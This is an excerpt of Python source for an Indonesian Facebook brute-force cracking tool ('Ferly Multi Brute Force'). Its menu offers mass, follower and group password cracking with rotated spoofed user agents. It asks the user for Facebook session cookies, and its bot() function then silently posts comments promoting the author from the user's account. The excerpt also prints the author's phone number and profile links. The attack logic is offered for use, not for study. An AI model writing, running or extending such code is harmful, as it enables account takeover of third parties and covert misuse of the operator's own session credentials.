...
Facebook : 'ãƒ•ã‚§ãƒªãƒ¼ ã‚·ã‚·ã‚¬ãƒŸ'
Version  : 'Next Blade v.2'
	
Author   = 'Ferly Shishigami X'
Facebook = 'ãƒ•ã‚§ãƒªãƒ¼ã‚·ã‚·ã‚¬ãƒŸ (https://m.facebook.com/profile.php?id=100056190665450)'
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Shishigami-X/FMBF-Facebook/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
kom1 = ("Keren Bang")
kom2 = ("Acc Dong Bang")
kom3 = ('Acc Guru','Hallo Ganteng','Kamu Ganteng Banget Deh Ferly><ðŸ˜','Panutan Gw Nih BossðŸ˜ŽðŸ–¥\n-\nhttps://www.facebook.com/photo?fbid=661200275762989&set=a.111112804105075','\n-\nSehat Selalu Master\n-\n \nKomentar Di Tulis Oleh Bot\n \n','["Sehat Selalu Bang @[100056190665450:0]','Sehat Selalu BangðŸ˜ŽðŸ–¥ @[100056190665450:0]\n\nJangan Pernah Menjadi Orang Yang Menyombongkan Diri Sendiri, Karena Kita Hidup Di Dunia Ini Tidak Sendirian, Jika Ada Orang Yang Membutuhkan Apa Salah Nya Kita Memberikan')
...
def banner():
	basari_tamvan('=' * 40)
	print(f"""{Z}[â€¢] Ferly Multi Brute Force  [â€¢]
{U} ____   _____  _____  _____    {U}_____  _____  _____  _____  _____  _____  _____  _____
{H}|    \ |  _  || __  ||  |  |  {H}|   __||  _  ||     ||   __|| __  ||     ||     ||  |  |
{K}|  |  ||     ||    -||    -|  {K}|   __||     ||   --||   __|| __ -||  |  ||  |  ||    -|
{M}|____/ |__|__||__|__||__|__|  {M}|__|   |__|__||_____||_____||_____||_____||_____||__|__|
   ...
   {M}â€¢{K}â€¢{H}â€¢ {P}Author   : Ferly Shishigami {H}â€¢{K}â€¢{M}â€¢
   {M}â€¢{K}â€¢{H}â€¢ {P}Facebook : ãƒ•ã‚§ãƒªãƒ¼ ã‚·ã‚·ã‚¬ãƒŸ {H}â€¢{K}â€¢{M}â€¢
   {M}â€¢{K}â€¢{H}â€¢ {P}WhatsApp : +6285797818026 {H}â€¢{K}â€¢{M}â€¢
   {M}â€¢{K}â€¢{H}â€¢ {P}Github   : Shishigami-X {H}â€¢{K}â€¢{M}â€¢""")
	basari_tamvan('=' * 40)
...
def login_bas():
	try:
		...
		cookie=input(f'  [{h}â€¢{x}] Masukkan Cookies :{linbas} ')
		...
		print(f'  %s[%sx%s]%s Login Gagal ! Cookie Invalid !%s'%(x,k,x,m,x))
		exit()
		
###>[ BOT BAS ]<###
def bot():
	try:
		requests.post(f"https://graph.facebook.com/661200275762989/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/661200275762989/comments/?message={kom2}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/661200275762989/comments/?message={kom3}&access_token={token}", headers = {"cookie":cok})
	except:
		pass
...
def menu(my_name,my_id):
	...
	basari_tamvan(f'[>] ID  : '+str(my_id))
	basari_tamvan(f'[>] IP  : {ip}')
	#basari_tamvan(f' Github   : Shishigami-X')
	basari_tamvan('=' * 40)
	cetak(' [â€¢] 1. Brute Force Massal\n [â€¢] 2. Brute Force Followers\n [â€¢] 3. Brute Force Group\n [â€¢] 4. Hasil Brute Force\n [â€¢] 5. Chat Author\n [â€¢] 0. Keluar')
	basari_tamvan('=' * 40)
	basari_sayang_syafaa = input('[?] Pilih : ')
	basari_tamvan('=' * 40)
	if basari_sayang_syafaa in ['1']:
		...
		back()
def authorbas():
	basari_tamvan(f'{sir}[!]   {x}')
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/profile.php?id=100056190665450)'")
	back()
...
###>[ CRACK GRUP FB ]<###
def grup():
	basari_tamvan(f'{b}[!] Maaf Fitur Ini Masih Dalam Perbaikan  {x}')
	time.sleep(4)
	back()
...
def crack(idf,pwv):
	...
	sys.stdout.flush()
	ua = random.choice(['Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro Build/QKQ1.190915.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 SessionId/'])
	...
	'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 SessionId/'
...
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\rV2 {P}{loop}{P}/{P}{len(id)}{P} OK {H}{ok}{P} CP {k}{cp}{x} {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
...
if __name__=='__main__':
	...
	basari_tamvan(f'\n\t{x} {h}Halo Selamat Datang...Selamat Menggunakan!!! :v{x}')
	time.sleep(3)
	login()
